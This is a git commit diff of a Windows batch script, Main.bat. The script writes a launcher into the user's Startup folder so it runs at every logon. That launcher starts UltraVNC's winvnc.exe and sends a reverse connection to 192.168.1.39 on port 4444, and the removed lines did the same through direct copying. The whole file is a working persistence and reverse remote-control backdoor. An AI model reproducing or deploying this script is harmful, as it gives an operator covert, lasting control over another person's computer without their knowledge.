37ec07ebc2a2325a818fdc91c8fb83212d374b30
GooseLoose0809 <122241263+GooseLoose0809@users.noreply.github.com>
2024-06-19 23:06:09 -0500

    Update Main.bat

--- Main.bat
+++ Main.bat
@@ -1,25 +1,28 @@
 @echo off
-set startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
 
-REM Copy the batch file itself to the startup folder if it doesn't already exist
-if not exist "%startup_folder%\%~nx0" (
-  copy "%~f0" "%startup_folder%\"
+REM Create the batch file for startup folder
+(
+  echo @echo off
+  echo start "" "%~dp0run_winvnc.bat"
+) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc.bat"
+
+REM Create the batch file to run winvnc.exe
+(
+  echo @echo off
+  echo start winvnc.exe -run
+  echo timeout /t 1 >nul
+  echo winvnc.exe -connect 192.168.1.39::4444
+) > "%~dp0run_winvnc.bat"
+
+REM Check if both batch files exist in their respective locations
+if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc.bat" (
+  echo startup_winvnc.bat created successfully in Startup folder.
+) else (
+  echo Failed to create startup_winvnc.bat in Startup folder.
 )
 
-REM Determine the directory where this batch file is located
-set script_dir=%~dp0
-
-REM Copy the ultravnc.ini file to the startup folder
-if exist "%script_dir%ultravnc.ini" (
-  copy "%script_dir%ultravnc.ini" "%startup_folder%\"
+if exist "%~dp0run_winvnc.bat" (
+  echo run_winvnc.bat created successfully in current directory.
+) else (
+  echo Failed to create run_winvnc.bat in current directory.
 )
-
-REM Copy the winvnc.exe file to the startup folder
-if exist "%script_dir%winvnc.exe" (
-  copy "%script_dir%winvnc.exe" "%startup_folder%\"
-)
-
-Start winvnc.exe
-start winvnc.exe -run
-timeout /t 1 >nul
-start winvnc.exe -connect 192.168.1.39::4444
